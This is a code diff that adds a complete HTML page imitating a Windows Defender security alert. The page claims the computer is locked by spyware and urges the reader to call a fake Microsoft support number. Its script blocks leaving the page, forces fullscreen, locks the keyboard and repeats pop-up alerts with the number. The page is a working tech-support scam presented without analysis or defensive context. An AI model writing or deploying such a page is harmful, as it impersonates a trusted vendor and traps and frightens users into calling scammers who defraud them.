@@ -1,0 +1,16 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Windows Defender Security Center</title></head>
+<body style="background:#0078d7;color:#fff">
+  <h1>Access to this PC has been blocked for security reasons</h1>
+  <p>Windows Defender detected Trojan spyware. Your computer has been locked.</p>
+  <p>Do not restart your computer. Error code: 0x80073afc</p>
+  <h2>Call Microsoft Support: +1 (888) 555-0199 (Toll Free)</h2>
+  <script>
+    window.addEventListener('beforeunload', function (e) { e.preventDefault(); e.returnValue = ''; });
+    try { document.documentElement.requestFullscreen().catch(function () {}); } catch (e) {}
+    try { navigator.keyboard && navigator.keyboard.lock(); } catch (e) {}
+    for (var i = 0; i < 3; i++) { alert('Windows Security Alert: call +1 (888) 555-0199'); }
+  </script>
+</body>
+</html>
